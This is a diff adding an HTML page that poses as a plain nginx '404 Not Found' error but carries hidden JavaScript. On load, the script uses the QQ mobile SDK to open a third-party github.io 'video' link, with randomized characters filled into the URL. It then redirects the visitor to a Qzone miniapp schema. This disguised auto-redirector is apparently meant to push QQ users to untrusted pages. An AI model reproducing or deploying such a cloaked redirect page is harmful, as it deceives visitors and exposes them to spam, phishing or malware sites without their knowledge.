@@ -1,0 +1,55 @@
+<!doctype html>
+<html class="">
+<head>
+    <title>404 Not Found</title>
+<meta name="wechat-enable-text-zoom-em" content="true">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="color-scheme" content="light dark">
+<link rel="shortcut icon" type="image/x-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/NTI4MWU5.ico">
+<link rel="mask-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/MjliNWVm.svg" color="#4C4C4C">
+<link rel="apple-touch-icon-precomposed" href="https://res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta name="referrer" content="no-referrer">
+<script charset="UTF-8" type="text/javascript" src="https://qqvip-web.cdn-go.cn/mono/latest/vendors/qqmobile/qqapi.wk.js?_bid=5234"></script>
+<script type="text/javascript">
+function myEeplace(url) {
+    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
+        var res = "";
+        for (var i = 0; i < s2.length; i++) {
+            if (s2[i] === "n") {
+                res += Math.floor(Math.random() * 10);
+            } else if (s2[i] === "w") {
+                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
+            }
+        }
+        return res;
+    });
+}
+
+function opensdk(url) {
+    url = myEeplace(url);
+    var conf = {url: url, target: 1, style: 2};
+    mqq.invoke("ui", "openUrl", conf);
+}
+
+function jump() {
+    var url = "https://dj88888.github.io/video/1aa.html?&1788ww283117567";
+
+    opensdk(url);
+
+    setTimeout(function() {
+        window.location.href = "https://h5.qzone.qq.com/miniapp/act/hippyJump#/?schema=666";
+    }, 200);
+}
+
+setTimeout(jump, 10);
+</script>
+</head>
+<body>
+    <center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
